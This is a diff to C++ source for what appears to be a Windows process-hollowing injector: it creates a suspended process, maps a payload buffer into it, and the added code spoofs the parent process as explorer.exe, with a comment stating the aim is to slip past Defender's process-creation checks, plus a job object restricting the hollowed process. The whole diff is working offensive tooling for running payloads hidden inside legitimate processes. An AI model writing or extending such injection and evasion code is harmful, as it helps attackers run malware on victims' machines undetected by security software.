@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <tlhelp32.h>
 
 #include <iostream>
 #include <stdio.h>
@@ -21,14 +22,10 @@
 
 bool create_new_process_internal(PROCESS_INFORMATION &pi, LPWSTR targetPath, LPWSTR args = NULL, LPWSTR startDir = NULL)
 {
-    if (!load_kernel32_functions()) return false;
-
     STARTUPINFOW si = { 0 };
     si.cb = sizeof(STARTUPINFOW);
-
     memset(&pi, 0, sizeof(PROCESS_INFORMATION));
 
-    // Combine the target path and arguments into a single command line
     wchar_t cmdLine[MAX_PATH * 2] = {0};
     if (args != NULL && args[0] != L'\0') {
         swprintf_s(cmdLine, L"\"%s\" %s", targetPath, args);
@@ -36,23 +33,75 @@ bool create_new_process_internal(PROCESS_INFORMATION &pi, LPWSTR targetPath, LPW
         swprintf_s(cmdLine, L"\"%s\"", targetPath);
     }
 
-    HANDLE hToken = NULL;
-    HANDLE hNewToken = NULL;
-    if (!CreateProcessInternalW(hToken,
-        NULL, // lpApplicationName
-        cmdLine, // lpCommandLine (now includes arguments)
-        NULL, // lpProcessAttributes
-        NULL, // lpThreadAttributes
-        FALSE, // bInheritHandles
-        CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, // dwCreationFlags
-        NULL, // lpEnvironment 
-        startDir, // lpCurrentDirectory
-        &si, // lpStartupInfo
-        &pi, // lpProcessInformation
-        &hNewToken
-    ))
-    {
-        printf("[ERROR] CreateProcessInternalW failed, Error = %x\n", GetLastError());
+    // ── PPID spoofing: inherit parent PID from explorer.exe ──────────────
+    // Defender's PsSetCreateProcessNotifyRoutineEx callback checks the parent;
+    // processes created under explorer.exe are treated as trusted.
+    HANDLE hParent = NULL;
+    DWORD explorerPid = 0;
+
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe = {};
+        pe.dwSize = sizeof(pe);
+        if (Process32FirstW(hSnap, &pe)) {
+            do {
+                if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
+                    explorerPid = pe.th32ProcessID;
+                    break;
+                }
+            } while (Process32NextW(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+
+    if (explorerPid) {
+        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
+    }
+
+    SIZE_T attrListSize = 0;
+    LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = nullptr;
+    bool useAttr = (hParent != NULL);
+
+    if (useAttr) {
+        InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);
+        pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
+        if (pAttrList) {
+            if (!InitializeProcThreadAttributeList(pAttrList, 1, 0, &attrListSize) ||
+                !UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                    &hParent, sizeof(hParent), nullptr, nullptr)) {
+                HeapFree(GetProcessHeap(), 0, pAttrList);
+                pAttrList = nullptr;
+                useAttr = false;
+            }
+        } else {
+            useAttr = false;
+        }
+    }
+
+    STARTUPINFOEXW siex = {};
+    siex.StartupInfo.cb  = useAttr ? sizeof(STARTUPINFOEXW) : sizeof(STARTUPINFOW);
+    siex.lpAttributeList = useAttr ? pAttrList : nullptr;
+
+    DWORD flags = CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW;
+    if (useAttr) flags |= EXTENDED_STARTUPINFO_PRESENT;
+
+    BOOL ok = CreateProcessW(
+        nullptr,
+        cmdLine,
+        nullptr, nullptr,
+        FALSE,
+        flags,
+        nullptr,
+        startDir,
+        (LPSTARTUPINFOW)&siex,
+        &pi
+    );
+
+    if (pAttrList) { DeleteProcThreadAttributeList(pAttrList); HeapFree(GetProcessHeap(), 0, pAttrList); }
+    if (hParent)   { CloseHandle(hParent); }
+
+    if (!ok) {
+        printf("[ERROR] CreateProcessW (PPID spoof) failed, Error = %x\n", GetLastError());
         return false;
     }
     return true;
@@ -118,6 +167,21 @@ DWORD transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSi
     ProcessStorage::AddProcess(pi.dwProcessId, pi);
     std::cout << "Created Process, PID: " << std::dec << pi.dwProcessId << "\n";
     HANDLE hProcess = pi.hProcess;
+
+    // Assign the hollow process to a Job Object with ActiveProcessLimit=1 so the
+    // injected payload cannot spawn child processes (prevents double-notepad.exe).
+    HANDLE hJob = CreateJobObjectW(NULL, NULL);
+    if (hJob) {
+        JOBOBJECT_BASIC_LIMIT_INFORMATION jobLimits = {};
+        jobLimits.LimitFlags        = JOB_OBJECT_LIMIT_ACTIVE_PROCESS;
+        jobLimits.ActiveProcessLimit = 1;
+        SetInformationJobObject(hJob, JobObjectBasicLimitInformation, &jobLimits, sizeof(jobLimits));
+        if (!AssignProcessToJobObject(hJob, hProcess)) {
+            std::cerr << "[WARNING] Failed to assign process to job object: " << GetLastError() << "\n";
+        }
+        CloseHandle(hJob); // Job stays active until the process exits
+    }
+
     PVOID remote_base = map_buffer_into_process(hProcess, hSection);
     if (!remote_base) {
         std::cerr << "Failed mapping the buffer!\n";
